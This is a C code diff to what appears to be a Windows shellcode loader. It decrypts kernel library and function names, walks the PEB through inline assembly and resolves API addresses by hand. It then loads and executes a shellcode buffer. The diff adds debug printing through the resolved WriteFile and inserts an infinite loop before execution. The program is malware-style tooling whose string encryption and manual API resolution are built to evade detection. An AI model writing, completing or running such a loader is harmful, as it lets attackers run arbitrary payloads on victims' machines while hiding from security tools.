@@ -172,7 +172,7 @@ void init_kernel_library(void){
     kernel_library_name = (const wchar_t *) (encrypted_kernel_library_name + iv_length);
     kernel_library_function_names = encrypted_kernel_library_function_names + iv_length;
      
-    //__asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
+    __asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
     kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
     for(int i = 0; i < number_kernel_library_functions; i++){
 	const char *function_name = get_function_by_number(kernel_library_function_names, i);
@@ -260,13 +260,29 @@ void shellcode_handling_execute(void *shellcode_address){
 }
 
 // MAIN
+void print_minimal(void) {
+    const char *msg = "Hello from minimal printf";
+    
+    // Assuming GetStdHandle and WriteFile are in kernel_library_function_addresses
+    HANDLE stdout_handle = ((HANDLE (__stdcall *)(DWORD)) kernel_library_function_addresses[9])(-11);
+    DWORD written;
+    ((BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
+}
+
 
 int main(void) {   
     init_kernel_library();
+    print_minimal();
     void *placed_shellcode = shellcode_handling_load(shellcode_to_execute, sizeof(shellcode_to_execute));
     if(placed_shellcode == NULL){
 	return -1;
     }
+    print_minimal();
+    while(1){
+
+    }
+    print_minimal();
     shellcode_handling_execute(placed_shellcode);
     return 0;
 }
+
